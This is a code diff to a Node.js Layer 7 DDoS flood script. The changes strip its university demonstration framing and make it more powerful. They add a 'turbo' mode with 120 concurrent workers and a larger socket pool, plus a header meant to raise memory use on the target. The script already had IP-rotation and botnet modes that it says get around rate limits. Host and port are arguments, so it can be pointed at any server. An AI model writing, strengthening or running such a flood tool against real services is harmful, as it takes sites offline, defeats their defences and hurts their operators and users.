@@ -1,10 +1,10 @@
 #!/usr/bin/env node
 /**
  * ============================================================================
- * UNIVERSITY DDOS DEMONSTRATION ATTACK SCRIPT
+ * LAYER 7 DDOS SIMULATION ATTACK SCRIPT
  * ============================================================================
  * 
- * Educational Objectives:
+ * Simulation Objectives:
  * 1. Simulate Layer 7 HTTP Floods against the target demo server.
  * 2. Demonstrate SURPASSING RATE LIMITS WITH THE IP CHANGING OPTION (--change-ip):
  *    - Standard express-rate-limit tracks quotas per IP (20 requests per 10s).
@@ -51,6 +51,10 @@ const isIpChanging = args.includes('--change-ip') ||
                      args.includes('--spoof-ips') ||
                      args.includes('-c');
 
+// Turbo mode: high-velocity concurrency and accelerated memory consumption
+const isTurbo = args.includes('--turbo') || args.includes('--fast') || args.includes('-t');
+const attackIntensityKb = getArg('--intensity', isTurbo ? '32' : '16');
+
 // How often to change IP: 1 = every single request, or e.g. 15 = every 15 requests
 const changeEveryN = parseInt(getArg('--change-every', getArg('--rotate-every', '1')), 10);
 
@@ -58,7 +62,10 @@ const isBotnet = args.includes('--botnet');
 const targetHost = getArg('--host', '127.0.0.1');
 const targetPort = parseInt(getArg('--port', '3000'), 10);
 const endpoint = getArg('--endpoint', '/');
-const concurrency = parseInt(getArg('--concurrency', isIpChanging ? '25' : '20'), 10);
+
+// Concurrency: 120 workers in turbo mode, 60 in IP-changing mode, 40 in standard mode
+const defaultConcurrency = isTurbo ? '120' : (isIpChanging ? '60' : '40');
+const concurrency = parseInt(getArg('--concurrency', defaultConcurrency), 10);
 const durationSec = parseInt(getArg('--duration', '0'), 10); // 0 = run until Ctrl+C
 
 // Fixed Botnet IPs (for --botnet mode)
@@ -102,17 +109,19 @@ let requestsWithCurrentIp = 0;
 
 const httpAgent = new http.Agent({
   keepAlive: true,
-  maxSockets: 300,
-  maxFreeSockets: 50
+  maxSockets: 1000,
+  maxFreeSockets: 250,
+  timeout: 5000
 });
 
 console.log(`
 ============================================================
- [DDoS Demo Attack Generator]
+ [DDoS Simulation Attack Generator]
  Target:       http://${targetHost}:${targetPort}${endpoint}
- Concurrency:  ${concurrency} simultaneous workers
+ Concurrency:  ${concurrency} simultaneous workers ${isTurbo ? '⚡ [TURBO ACCELERATED]' : ''}
+ Memory Impact: ${attackIntensityKb} KB allocated per accepted request
  Mode:         ${isIpChanging 
-                 ? '🔥 IP CHANGING ACTIVE (--change-ip): Surpasses Rate Limits!' 
+                 ? '🔥 IP ROTATION ACTIVE (--change-ip): Surpasses Rate Limits!' 
                  : (isBotnet ? '🤖 DISTRIBUTED BOTNET (Fixed 7-Node Pool)' : '👤 STATIC SINGLE IP (Vulnerable to Rate Limiting)')}
  Duration:     ${durationSec > 0 ? `${durationSec} seconds` : 'Continuous (Press Ctrl+C to stop)'}
 ============================================================
@@ -150,7 +159,8 @@ function sendRequest() {
   activeRequests++;
 
   const headers = {
-    'User-Agent': 'DDoSDemoBot/3.0 (University Lab Simulator)'
+    'User-Agent': 'DDoSDemoBot/3.0 (DDoS Simulation Bot)',
+    'X-Attack-Intensity': attackIntensityKb
   };
 
   // Determine Source IP strategy
@@ -179,8 +189,8 @@ function sendRequest() {
     agent: httpAgent,
     timeout: 5000
   }, (res) => {
-    let rawData = '';
-    res.on('data', chunk => { rawData += chunk; });
+    // Resume stream immediately without building string buffer in memory
+    res.resume();
     res.on('end', () => {
       const elapsed = Date.now() - startTime;
       latencies.push(elapsed);
